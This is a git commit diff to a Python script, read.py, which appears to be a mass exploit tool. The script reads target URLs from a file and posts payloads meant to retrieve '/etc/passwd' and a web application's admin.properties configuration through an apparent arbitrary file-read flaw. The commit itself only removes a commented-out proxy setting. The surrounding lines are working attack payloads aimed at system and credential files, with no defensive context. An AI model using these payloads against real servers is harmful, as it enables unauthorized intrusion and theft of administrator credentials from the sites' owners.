e05a62e0d439bc9a283fae94760874e19f23cb5d
XD <57057346+Xd-tl@users.noreply.github.com>
2021-12-13 00:21:23 +0800

    Update read.py

--- read.py
+++ read.py
@@ -13,11 +13,8 @@ header = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
     "Content-Type": "application/x-www-form-urlencoded"
 }
-'''
-proxies = {
-    "http": "//127.0.0.1:8080"
-}
-'''
+
+
 urls = open('urls.txt', 'r').read().split('\n')
 data = 'var={"body": {"file": "file:///etc/passwd"}}'
 data = 'var={"body": {"file": "/WEB-INF/KmssConfig/admin.properties"}}'
